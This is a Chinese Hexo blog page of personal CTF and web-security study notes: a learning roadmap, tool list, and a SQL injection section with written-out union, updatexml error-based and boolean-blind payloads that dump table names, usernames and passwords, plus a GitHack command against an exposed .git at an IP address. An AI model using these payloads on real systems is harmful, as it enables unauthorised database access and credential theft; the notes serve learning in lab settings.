<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><title>Hexo</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '6.3.0'
} </script><meta name="generator" content="Hexo 6.3.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202307311922384.jpg"></div><div class="author-info__name text-center">John Doe</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">53</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">3</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">39</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Hexo</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Hexo</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2023/08/32e240f3738f.html">No title</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-08-02</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/">culitivate</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/PHP/">PHP</a></span><div class="content"><p>弱类型</p>
<p>==&#x3D;在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>=&#x3D;在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
<p>1=&#x3D;=true:false<br>1=&#x3D;ture:true</p>
<p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/08/1b0a1e9c8caf.html">No title</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-08-02</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/">culitivate</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/other/">other</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/other/CTF/">CTF</a></span><div class="content"><p><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202308021038410.png" alt="image.png"></p>
<h1 id="学习平台"><a href="#学习平台" class="headerlink" title="学习平台"></a>学习平台</h1><p><img src="file:///C:\Users\Administrator\AppData\Roaming\Tencent\QQ\Temp[5UQ[BL(6~BS2JV6W}N6[%S.png"><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1eq4y1x71H?p=5&vd_source=51ce6b684d2afd4de72a9121533cd3ca">https://www.bilibili.com/video/BV1eq4y1x71H?p=5&amp;vd_source=51ce6b684d2afd4de72a9121533cd3ca</a><br>\<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1eq4y1x71H?p=5&vd_source=51ce6b684d2afd4de72a9121533cd3ca">https://www.bilibili.com/video/BV1eq4y1x71H?p=5&amp;vd_source=51ce6b684d2afd4de72a9121533cd3ca</a><br>练习平台<br><img src="file:///C:\Users\Administrator\AppData\Roaming\Tencent\QQ\Temp%W@GJ$ACOF(TYDYECOKVDYB.png"><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/407953508">https://zhuanlan.zhihu.com/p/407953508</a><br>\<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/407953508">https://zhuanlan.zhihu.com/p/407953508</a></p>
<p><img src="file:///C:\Users\Administrator\AppData\Roaming\Tencent\QQ\Temp%W@GJ$ACOF(TYDYECOKVDYB.png"><a target="_blank" rel="noopener" href="https://blog.csdn.net/wanzt123/article/details/75174675">https://blog.csdn.net/wanzt123/article/details/75174675</a></p>
<p><img src="file:///C:\Users\Administrator\AppData\Roaming\Tencent\QQ\Temp%W@GJ$ACOF(TYDYECOKVDYB.png"><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/393641905">https://zhuanlan.zhihu.com/p/393641905</a></p>
<p><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202308021505060.png" alt="image.png"></p>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>Burp Suite<br>·主要功能:<br>1．拦截、查看或者修改网络请求和响应。2.扫描web应用程序的安全漏洞。<br>3．自动化攻击web应用。<br>4．对数据编码和解码。</p>
<p>HackBar<br>浏览器插件<br>帮助测试sql注入，xss漏洞利用</p>
<p>sqlmap<br>sql自动注入工具</p>
<p>webshell管理工具<br>蚁剑：网站管理工具<br>冰蝎：通信过程中使用AES加密<br>哥斯拉：替代工具</p>
<p>安全导航:<br>纳威安全导航: <a target="_blank" rel="noopener" href="https://navisec.it/">https://navisec.it/</a><br>安全圈info:<a target="_blank" rel="noopener" href="https://www.anquanquan.info/">https://www.anquanquan.info/</a><br>渗透师导航:<a target="_blank" rel="noopener" href="https://www.shentoushi.top/">https://www.shentoushi.top/</a></p>
<h1 id="日程安排"><a href="#日程安排" class="headerlink" title="日程安排"></a>日程安排</h1><h2 id="4-1、初期"><a href="#4-1、初期" class="headerlink" title="4.1、初期"></a>4.1、初期</h2><p>刚刚走进大学，入了web安全的坑，面对诸多漏洞必然是迷茫的，这时的首要任务就是打好网站开发的基础，曾有伟人说过-“自己不会做网站，何谈去找网站的漏洞”，在学习漏洞前，了解基本网站架构、基础网站开发原理，基础的前后端知识，能够让你之后的漏洞学习畅通无阻。</p>
<h3 id="0、协议基础：HTTP、TCP-x2F-IP"><a href="#0、协议基础：HTTP、TCP-x2F-IP" class="headerlink" title="0、协议基础：HTTP、TCP&#x2F;IP"></a>0、协议基础：HTTP、TCP&#x2F;IP</h3><h3 id="1、html-css-js（2-3天）"><a href="#1、html-css-js（2-3天）" class="headerlink" title="1、html+css+js（2-3天）"></a>1、html+css+js（2-3天）</h3><p>前端三要素 html、css、js是被浏览器解析的代码，是构成静态页面的基础。也是前端漏洞如xss、csrf的基础。</p>
<p><strong>☆重点了解html和js</strong></p>
<p>推荐学习资料：</p>
<ul>
<li><a href="https://link.zhihu.com/?target=https://www.runoob.com/">https://www.runoob.com/</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.w3school.com.cn/">https://www.w3school.com.cn/</a></li>
</ul>
<p>能力要求：</p>
<ul>
<li>能够写出简单表单，能够通过js获取DOM元素，控制DOM树即可。</li>
</ul>
<h3 id="2、apache-php-（4-5天）"><a href="#2、apache-php-（4-5天）" class="headerlink" title="2、apache+php （4-5天）"></a>2、apache+php （4-5天）</h3><p>推荐使用phpstudy来进行傻瓜式安装，可以少走很多弯路。通过apache+php体会一下网站后端的工作，客户端浏览器通过请求apache服务器上的php脚本，php执行后生成的html页面返回给浏览器进行解析。</p>
<p><strong>☆重点了解php</strong></p>
<p>推荐学习资料：</p>
<ul>
<li><a href="https://link.zhihu.com/?target=https://www.runoob.com/">https://www.runoob.com/</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.w3school.com.cn/">https://www.w3school.com.cn/</a></li>
</ul>
<p>能力要求：</p>
<ul>
<li>了解基本网站原理，了解php基本语法，开发简单动态页面</li>
</ul>
<h3 id="3、mysql-（2-3天）"><a href="#3、mysql-（2-3天）" class="headerlink" title="3、mysql （2-3天）"></a>3、mysql （2-3天）</h3><p>之前已经安装的phpstudy可以轻易的安装mysql。mysql是一款典型的关系型数据库，一般来说，大部分网站都会带有数据库进行数据存储。</p>
<p><strong>☆重点了解sql语句</strong></p>
<p>推荐学习资料：</p>
<ul>
<li><a href="https://link.zhihu.com/?target=https://www.runoob.com/">https://www.runoob.com/</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.w3school.com.cn/">https://www.w3school.com.cn/</a></li>
</ul>
<p>能力要求：</p>
<ul>
<li>能够用sql语句实现增删改查，并且能用php+mysql开发一个增删改查的管理系统（如学生管理系统）</li>
</ul>
<h3 id="4、python-2-3天"><a href="#4、python-2-3天" class="headerlink" title="4、python (2-3天)"></a>4、python (2-3天)</h3><p>虽然 “php是最好的语言”，但它主要还是应用在服务端做网站开发，我们搞安全经常需要写一些脚本或工具来进行诸如密码爆破、目录扫描、攻击自动化等操作，需要一个方便且趁手的编程语言，这里我推荐python</p>
<p><strong>☆重点学习requests、BeautifulSoup、re这三个库</strong></p>
<p>推荐学习资料</p>
<ul>
<li><a href="https://link.zhihu.com/?target=https://www.runoob.com/">https://www.runoob.com/</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.w3school.com.cn/">https://www.w3school.com.cn/</a></li>
</ul>
<p>能力要求：</p>
<ul>
<li>了解python基础语法，能够用python爬取网站上的信息（requests+BeautifulSoup+re）</li>
</ul>
<h3 id="5、burpsuite-（1-2天）"><a href="#5、burpsuite-（1-2天）" class="headerlink" title="5、burpsuite （1-2天）"></a>5、burpsuite （1-2天）</h3><p>web安全的工具很多，但我觉得必备的渗透工具还得是它</p>
<p>重点学习Proxy、Repeater、Intruder三个模块，分别用于抓包放包、重放包、爆破</p>
<p>初步使用即可，在中期的漏洞学习中去逐渐熟练它</p>
<p>推荐学习资料</p>
<ul>
<li>DVWA之暴力破解</li>
</ul>
<p>能力要求：</p>
<ul>
<li>能够用burpsuite抓包改包、爆破用户名密码</li>
</ul>
<h2 id="4-2、中期"><a href="#4-2、中期" class="headerlink" title="4.2、中期"></a>4.2、中期</h2><p>此时我们对网站已经不再陌生，能够自己动手完成一个简单站点。但我们写出来的代码真的安全吗？进入中期，我们便要开始着眼经典漏洞的学习。</p>
<p>一个漏洞的学习，要搞明白三点（每学完一个漏洞就问自己这三个问题）：</p>
<ul>
<li>如何利用这个漏洞？</li>
<li>为什么会产生这个漏洞？</li>
<li>如何修复这个漏洞？</li>
</ul>
<h3 id="1、SQL注入（7-8天）"><a href="#1、SQL注入（7-8天）" class="headerlink" title="1、SQL注入（7-8天）"></a>1、SQL注入（7-8天）</h3><p>我们web狗学习的第一个漏洞一般都是SQL注入，它是web安全经典fg中的经典，也是在这里被灌输 “永远不信任用户的输入” 的口号，即使是现在sql注入也依旧存在，并且它还在不断衍生出如nosql注入、ORM注入等，可谓防不胜防。</p>
<p>推荐学习资料：</p>
<ul>
<li>sqli-labs：如何使用它网上有很多教学，wp也有很多大佬写了 这里贴一个<a href="https://link.zhihu.com/?target=https://blog.csdn.net/wang_624/article/details/101913584">https://blog.csdn.net/wang_624&#x2F;article&#x2F;details&#x2F;101913584</a></li>
<li>sqlmap：sql注入神器，有余力可以去看看它的源码，学习一下大佬进行sql注入并把它自动化的思路</li>
<li>buuctf：找相关的真题进行练习 wp百度一搜就有</li>
<li>[极客大挑战 2019]EasySQL</li>
<li>[极客大挑战 2019]LoveSQL</li>
<li>[SUCTF 2019]EasySQL</li>
</ul>
<p>能力要求：</p>
<ul>
<li>能够手工注入出任意表的数据，熟悉三种盲注的手法，能够通过sql注入实现任意文件读取和任意文件写入，能够自己编写一个不含sql注入的查询功能</li>
</ul>
<h3 id="2、文件上传（7-8天）"><a href="#2、文件上传（7-8天）" class="headerlink" title="2、文件上传（7-8天）"></a>2、文件上传（7-8天）</h3><p>webshell是可以进行代码执行的木马</p>
<p>而文件上传其实就是想办法把webshell上传到目标的服务器上去并成功解析，达到控制目标服务器的目的，这也是web安全的一个重点内容</p>
<p>推荐学习资料</p>
<ul>
<li>upload-labs：几乎涵盖所有上传漏洞类型</li>
<li>buuctf：找相关的真题进行练习（[ACTF2020 新生赛]Upload）</li>
<li>趁手的webshell管理工具： 蚁剑</li>
</ul>
<p>能力要求：</p>
<ul>
<li>会写php的webshell，明白webshell的原理，熟悉常见的文件上传绕过方法（如过后缀检测、过文件头检测、过MIME类型检测），能够自己编写一个不含漏洞的上传功能</li>
</ul>
<h3 id="3、其他漏洞（14-15天）"><a href="#3、其他漏洞（14-15天）" class="headerlink" title="3、其他漏洞（14-15天）"></a>3、其他漏洞（14-15天）</h3><p>以上两个漏洞是我认为一个初学者最应该掌握也是最典型的漏洞，涵盖了代码执行、文件操作、数据库操作等web应用的主体内容。然而web安全的世界还有很多的漏洞需要你去探索，不过学会了这两种漏洞的你去学其他漏洞定然是游刃有余，不会像刚开始那么困惑了。</p>
<p>以下四个为中期要掌握的漏洞</p>
<ul>
<li>命令执行（RCE）：php常见的代码执行（eval）、命令执行（system）函数</li>
<li>文件包含：file协议、php伪协议的利用</li>
<li>XSS：通过XSS获取用户cookie</li>
<li>CSRF：通过csrf让用户点击恶意链接就触发敏感操作</li>
</ul>
<h2 id="4-3、后期"><a href="#4-3、后期" class="headerlink" title="4.3、后期"></a>4.3、后期</h2><p>此时的你熟悉了web安全几个核心的漏洞，并且有了一些ctf题目的练习经验，已经是一个合格的ctfer了。恭喜你。成功入门web安全。后续的学习方法或许该由你自己决定，我在此只给一些建议。</p>
<h1 id="学习笔记"><a href="#学习笔记" class="headerlink" title="学习笔记"></a>学习笔记</h1><p><a target="_blank" rel="noopener" href="https://www.wolai.com/ctfhub/bRAuA3ejCzD2461TFrJada">基础知识 (wolai.com)</a></p>
<ul>
<li><strong>MISC（安全杂项）</strong>：全称Miscellaneous。题目涉及流量分析、电子取证、人肉搜索、数据分析、大数据统计等等，覆盖面比较广。我们平时看到的社工类题目；给你一个流量包让你分析的题目；取证分析题目，都属于这类题目。主要考查参赛选手的各种基础综合知识，考察范围比较广。</li>
<li><strong>PPC（编程类）</strong>：全称Professionally Program Coder。题目涉及到程序编写、编程算法实现。算法的逆向编写，批量处理等，有时候用编程去处理问题，会方便的多。当然PPC相比ACM来说，还是较为容易的。至于编程语言嘛，推荐使用Python来尝试。这部分主要考察选手的快速编程能力。</li>
<li><strong>CRYPTO（密码学）</strong>：全称Cryptography。题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。实验吧“角斗场”中，这样的题目汇集的最多。这部分主要考查参赛选手密码学相关知识点。</li>
<li><strong>REVERSE（逆向）</strong>：全称reverse。题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译扎实功底。需要掌握汇编，堆栈、寄存器方面的知识。有好的逻辑思维能力。主要考查参赛选手的逆向分析能力。此类题目也是线下比赛的考察重点。</li>
<li><strong>STEGA（隐写）</strong>：全称Steganography。隐写术是我开始接触CTF觉得比较神奇的一类，知道这个东西的时候感觉好神奇啊，黑客们真是聪明。题目的Flag会隐藏到图片、音频、视频等各类数据载体中供参赛选手获取。载体就是图片、音频、视频等，可能是修改了这些载体来隐藏flag，也可能将flag隐藏在这些载体的二进制空白位置。有时候需要你侦探精神足够的强，才能发现。此类题目主要考查参赛选手的对各种隐写工具、隐写算法的熟悉程度。实验吧“角斗场”的隐写题目在我看来是比较全的，以上说到的都有涵盖。新手盆友们可以去了解下。</li>
<li><strong>PWN（溢出）</strong>：PWN在黑客俚语中代表着攻破，取得权限，在CTF比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有栈溢出、堆溢出。在CTF比赛中，线上比赛会有，但是比例不会太重，进入线下比赛，逆向和溢出则是战队实力的关键。主要考察参数选手漏洞挖掘和利用能力。<br> <strong>WEB（web类）</strong>：WEB应用在今天越来越广泛，也是CTF夺旗竞赛中的主要题型，题目涉及到常见的Web漏洞，诸如注入、XSS、文件包含、代码审计、上传等漏洞。这些题目都不是简单的注入、上传题目，至少会有一层的安全过滤，需要选手想办法绕过。且Web题目是国内比较多也是大家比较喜欢的题目。因为大多数人开始安全都是从web日站开始的。</li>
</ul>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="1-Linux-基本命令"><a href="#1-Linux-基本命令" class="headerlink" title="1.Linux 基本命令"></a>1.Linux 基本命令</h3><p><a href="Linux.md">Linux</a></p>
<h3 id="2-http、TCP-x2F-IP协议"><a href="#2-http、TCP-x2F-IP协议" class="headerlink" title="2.http、TCP&#x2F;IP协议"></a>2.http、TCP&#x2F;IP协议</h3><p><a href="%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE.md">网络协议</a></p>
<h3 id="3-SQL、PHP、JS"><a href="#3-SQL、PHP、JS" class="headerlink" title="3.SQL、PHP、JS"></a>3.SQL、PHP、JS</h3><p><a href="PHP%E7%AC%94%E8%AE%B0.md">PHP笔记</a></p>
<h2 id="工具学习"><a href="#工具学习" class="headerlink" title="工具学习"></a>工具学习</h2><h3 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h3><p>·主要功能:<br>1．拦截、查看或者修改网络请求和响应。<br>2.扫描web应用程序的安全漏洞。<br>3．自动化攻击web应用。<br>4．对数据编码和解码。</p>
<p>教程：<br>\<a target="_blank" rel="noopener" href="https://blog.csdn.net/Forget_liu/article/details/129824815">https://blog.csdn.net/Forget_liu/article/details/129824815</a></p>
<p>\<a target="_blank" rel="noopener" href="https://blog.csdn.net/YQavenger/article/details/108611357?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-108611357-blog-129824815.235%5Ev38%5Epc_relevant_sort_base2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-108611357-blog-129824815.235%5Ev38%5Epc_relevant_sort_base2&utm_relevant_index=2">https://blog.csdn.net/YQavenger/article/details/108611357?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-108611357-blog-129824815.235%5Ev38%5Epc_relevant_sort_base2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-108611357-blog-129824815.235%5Ev38%5Epc_relevant_sort_base2&amp;utm_relevant_index=2</a></p>
<p>\<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/547973012?utm_id=0">https://zhuanlan.zhihu.com/p/547973012?utm_id=0</a><br>应用场景：<br>\<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15127666/4516339">https://blog.51cto.com/u_15127666/4516339</a></p>
<h3 id="HackBar"><a href="#HackBar" class="headerlink" title="HackBar"></a>HackBar</h3><p>浏览器插件<br>帮助测试sql注入，xss漏洞利用</p>
<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>sql自动注入工具</p>
<p>sqlmap教程：<br>\<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33530840/article/details/82144515">https://blog.csdn.net/qq_33530840/article/details/82144515</a><br>\<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a></p>
<h3 id="webshell管理工具"><a href="#webshell管理工具" class="headerlink" title="webshell管理工具"></a>webshell管理工具</h3><p>蚁剑：网站管理工具<br>冰蝎：通信过程中使用AES加密<br>哥斯拉：替代工具<br>查看隐藏文件，网址</p>
<h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><p>git泄露，目录扫描<br>用于发现git泄露<br>教程：<br>\<a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13600490.html">https://www.cnblogs.com/linfangnan/p/13600490.html</a></p>
<p>命令：<br>\<a target="_blank" rel="noopener" href="http://www.onctf.com/posts/b4763959.html">http://www.onctf.com/posts/b4763959.html</a></p>
<p>dirsearch发现git泄露<br>githack获取源码<br>activate cc</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHack.py http://220.249.52.133:58698/.git/</span><br></pre></td></tr></table></figure>
<p>进行代码审计</p>
<h2 id="Misc（杂项）"><a href="#Misc（杂项）" class="headerlink" title="Misc（杂项）"></a>Misc（杂项）</h2><p>解码：<br>\<a target="_blank" rel="noopener" href="https://www.codeeeee.com/encrypt/rabbit.html">https://www.codeeeee.com/encrypt/rabbit.html</a><br>\<a target="_blank" rel="noopener" href="https://www.iamwawa.cn/">https://www.iamwawa.cn/</a></p>
<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>匹配网站<br>\<a target="_blank" rel="noopener" href="https://regexr.com/">https://regexr.com/</a><br>菜鸟教程：<br>\<a target="_blank" rel="noopener" href="https://www.runoob.com/regexp/regexp-tutorial.html">https://www.runoob.com/regexp/regexp-tutorial.html</a></p>
<h3 id="文件操作与隐写"><a href="#文件操作与隐写" class="headerlink" title="文件操作与隐写"></a>文件操作与隐写</h3><h3 id="图片隐写术"><a href="#图片隐写术" class="headerlink" title="图片隐写术"></a>图片隐写术</h3><p>工具<br>\<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62770485/article/details/124231894">https://blog.csdn.net/m0_62770485/article/details/124231894</a><br>思路<br>\<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_14449312/3902300">https://blog.51cto.com/u_14449312/3902300</a><br>1.winhex看文本<br>2.stegdetect检测<br>\<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1875">https://xz.aliyun.com/t/1875</a></p>
<h3 id="压缩文件处理"><a href="#压缩文件处理" class="headerlink" title="压缩文件处理"></a>压缩文件处理</h3><h3 id="流量取证技术"><a href="#流量取证技术" class="headerlink" title="流量取证技术"></a>流量取证技术</h3><h2 id="Crypto（密码学）"><a href="#Crypto（密码学）" class="headerlink" title="Crypto（密码学）"></a>Crypto（密码学）</h2><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>思路：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64815693/article/details/126834664">https://blog.csdn.net/m0_64815693/article/details/126834664</a><br>\<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64815693/article/details/126834664">https://blog.csdn.net/m0_64815693/article/details/126834664</a></p>
<h3 id="一、SQL注入"><a href="#一、SQL注入" class="headerlink" title="一、SQL注入"></a>一、SQL注入</h3><p>sqlmap教程：<br>\<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a></p>
<p>sql注入教程：<br>\<a target="_blank" rel="noopener" href="https://www.cnblogs.com/snad/p/17247726.html">https://www.cnblogs.com/snad/p/17247726.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># table 1</span><br><span class="line">schemata --&gt; 存储该用户创建的所有数据库的库名</span><br><span class="line">schema_name --&gt; 记录数据库库名的字段</span><br><span class="line"></span><br><span class="line"># table 2</span><br><span class="line">tables --&gt; 存储该用户创建的所有数据库的库名和表名</span><br><span class="line">table_schema --&gt; 记录数据库库名的字段</span><br><span class="line">table_name --&gt; 记录数据库表名的字段</span><br><span class="line"></span><br><span class="line"># table 3</span><br><span class="line">columns --&gt; 存储该用户创建所有数据库的库名、表名和字段名</span><br><span class="line">table_schema --&gt; 记录数据库库名的字段</span><br><span class="line">table_name --&gt; 记录数据库表名的字段</span><br><span class="line">column_name --&gt; 记录表中的字段名的字段</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="1-联合查询注入"><a href="#1-联合查询注入" class="headerlink" title="1.联合查询注入"></a>1.联合查询注入</h4><p>CnHongke{8sblmmh65nu1sdki40od3iiud7}</p>
<p>爆库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `uu` WHERE flag=&#x27;a&#x27;  UNION select 1,2,group_concat(table_name) from information_schema.`TABLES` WHERE table_schema=database()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema = &#x27;dvwa&#x27; #</span><br></pre></td></tr></table></figure>
<p>爆表字段：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,group_concat(column_name)  from information_schema.columns where table_schema=database() and table_name=&#x27;user&#x27;</span><br></pre></td></tr></table></figure>
<p>构造payload获取值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(id),group_concat(username) from user</span><br></pre></td></tr></table></figure>


<h4 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h4><p><strong>1.通过updatexml()函数进行报错注入</strong><br>函数解释：<br><strong>UPDATEXML (XML_document, XPath_string, new_value);</strong><br>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 xml_target 新的XML片段 new_xml ，然后返回更 改的XML。xml_target替换的部分 与xpath_expr 用户提供的XPath表达式匹配。如果未xpath_expr找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 xml_targetXML片段。</p>
<p>报错原理<br>这里和extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容。</p>
<p>约束条件<br>输出字符长度限制为32个字符</p>
<p><strong>?id&#x3D;1’ and updatexml(1, concat(0x7e, database(),0x7e),1) – a</strong></p>
<p><strong>?id&#x3D;1’ and updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables</strong><br><strong>where table_schema &#x3D; database()), 0x7e), 1) – a</strong></p>
<p><strong>?id&#x3D;1’ and updatexml(1, concat(0x7e, (select group_concat(column_name) from</strong><br><strong>information_schema.columns where table_schema &#x3D; database() and table_name &#x3D; ‘users’), 0x7e),1) – a</strong></p>
<p><strong>?id&#x3D;1’ and updatexml(1, concat(0x7e, (select group_concat(username) from users), 0x7e),1) – a</strong><br><strong>?id&#x3D;1’ and updatexml(1, concat(0x7e, (select group_concat(password) from users), 0x7e),1) – a</strong></p>
<h4 id="3-Bool盲注"><a href="#3-Bool盲注" class="headerlink" title="3.Bool盲注"></a>3.Bool盲注</h4><p><strong>① 判断数据库的长度</strong><br><strong>?id&#x3D;1’ and length(database())&gt;7 – a</strong><br><strong>?id&#x3D;1’ and length(database())&gt;8 – a   回显不同，说明数据库的长度是8个字符</strong><br><strong>① 获取数据库名</strong><br><strong>?id&#x3D;1’ and ascii(substr(select database(),1,1))&#x3D;97 – a</strong></p>
<p><strong>② 判断库里表的个数</strong><br><strong>?id&#x3D;1’ and (select count(table_name) from information_schema.tables where table_schema &#x3D; database()) &gt; 3 – a</strong><br><strong>?id&#x3D;1’ and (select count(table_name) from information_schema.tables where table_schema &#x3D; database()) &gt; 4 – a</strong></p>
<p><strong>③ 获取库里各个表名的长度</strong><br><strong>?id&#x3D;1’ and length(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0, 1)&gt;8 – a</strong><br><strong>③ 获取库里第一个表名中的第一个字符的ASCII值，可以此推断出表名，可借助bp爆破</strong><br><strong>?id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where table_schema &#x3D;</strong><br><strong>database() limit 0, 1),1,1))&#x3D;101 – a</strong></p>
<p><strong>④ 获取users表里的字段数</strong><br><strong>?id&#x3D;1’ and (select count(column_name) from information_schema.columns where table_schema &#x3D;</strong><br><strong>database() and table_name &#x3D; ‘users’) &#x3D; 3 – a</strong></p>
<p><strong>⑤ 获取各字段(列名)长度</strong><br><strong>?id&#x3D;1’ and length(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name &#x3D; ‘users’ limit 0, 1)&gt;8 – a</strong><br><strong>⑤ 获取字段名称</strong><br><strong>?id&#x3D;1’ and ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;</strong><br><strong>database() and table_name &#x3D; ‘users’ limit 0, 1), 1, 1) )&#x3D;97 – a</strong></p>
